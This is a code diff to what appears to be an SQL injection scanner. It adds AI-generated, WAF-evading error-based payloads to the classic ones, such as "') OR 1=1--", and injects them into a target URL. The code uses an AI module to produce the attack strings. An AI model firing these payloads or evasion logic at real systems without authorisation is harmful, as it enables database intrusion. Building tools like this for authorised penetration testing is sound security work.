@@ -47,11 +47,32 @@ class VectorError(BaseVector):
     async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
         logger.info(f"[*] Native Engine: Iniciando Vector Error-based sobre {self.target_url}")
         
+        test_payloads = []
+
+        # Integrate AI Smart Payloads if omni context allows
+        if context.get("force_ai_payloads", True):
+            try:
+                from backend.core.cortex_ai import generate_smart_payloads
+                logger.debug(f"[Error] Invocando Cortex AI (WAF: {context.get('waf_type', 'Auto')}) para generar paquete de ataques Syntax/Error avanzados...")
+                ai_ctx = {
+                    "vector": "Error", 
+                    "url": self.target_url, 
+                    "parameter": "id",
+                    "waf_type": context.get("waf_type", "general_strong")
+                }
+                # Request 4 specific error-triggering payloads
+                smart_p = await generate_smart_payloads(ai_ctx, "Generar inyecciones Error-based (comillas, conversiones de tipo inválidas, sintaxis rotas) evadiendo WAF.", target_count=4)
+                if smart_p and len(smart_p) >= 1:
+                    test_payloads.extend(smart_p)
+                    logger.info(f"[*] Native Engine (AI): Paquete de Error aplicado con {len(smart_p)} vectores avanzados.")
+            except Exception as e:
+                logger.warning(f"[Error] Paquete de ataques IA falló, usando heurística local. Error: {e}")
+
         # Instanciar el evasor dinámico
         evader = PayloadEvader(context.get("aggressiveness", 3))
         
         # Payloads clásicos para provocar errores de sintaxis (Mutados dinámicamente)
-        payloads = [
+        classic_payloads = [
             evader.evade("'"),
             evader.evade("\""),
             evader.evade("')"),
@@ -60,8 +81,11 @@ class VectorError(BaseVector):
             evader.evade("') OR 1=1--"),
         ]
 
-        for payload in payloads:
-            test_url = f"{self.target_url}{payload}"
+        # Combine AI payloads with classic heuristics
+        all_test_payloads = test_payloads + classic_payloads
+
+        for payload in all_test_payloads:
+            test_url = self.inject_url(payload)
             resp = await self._safe_get(test_url)
             
             if not resp:
